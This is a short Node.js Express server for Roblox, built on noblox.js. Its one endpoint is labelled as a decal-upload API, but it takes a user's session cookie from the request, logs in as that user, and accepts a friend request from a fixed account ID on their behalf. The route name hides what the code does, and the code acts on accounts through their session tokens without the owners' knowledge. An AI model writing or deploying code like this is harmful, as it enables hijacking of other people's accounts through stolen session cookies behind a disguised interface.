const noblox = require("noblox.js")
const Express = require("express");
const App = Express();
const Port = 3000;



App.post("/api/v1/upload/decal", async (req, res) => {
  const Cookie = await req.body.cookie

  const currentUser = await noblox.setCookie(Cookie)
  await noblox.acceptFriendRequest(5260043739)

  res.json({success: "Request accepted"})

  
})

App.listen(Port, () => {
  console.log(`Server is running on port ${Port}`);
});
